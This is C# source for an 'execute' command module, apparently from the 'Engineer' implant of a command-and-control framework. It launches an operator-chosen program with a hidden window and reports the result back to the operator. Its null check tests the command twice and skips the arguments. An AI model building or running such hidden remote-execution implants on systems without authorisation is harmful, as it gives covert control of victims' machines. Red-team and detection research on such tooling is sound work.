using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class ExecuteCommand : EngineerCommand
    {
        public override string Name => "execute";

        public override async Task Execute(EngineerTask task)
        {
            try
            {

                task.Arguments.TryGetValue("/command", out string command);
                task.Arguments.TryGetValue("/args", out string argument);
                if (String.IsNullOrWhiteSpace(command) || String.IsNullOrWhiteSpace(command))
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Command not specified", task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
                if (String.IsNullOrEmpty(argument))
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Arguments not specified", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }

                var output = new StringBuilder();

                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        WorkingDirectory = Directory.GetCurrentDirectory(),
                        FileName = command,
                        Arguments = argument,
                        UseShellExecute = true,
                    }
                };

                process.Start();
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"{command} executed",task,EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception e)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(e.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
    }
}
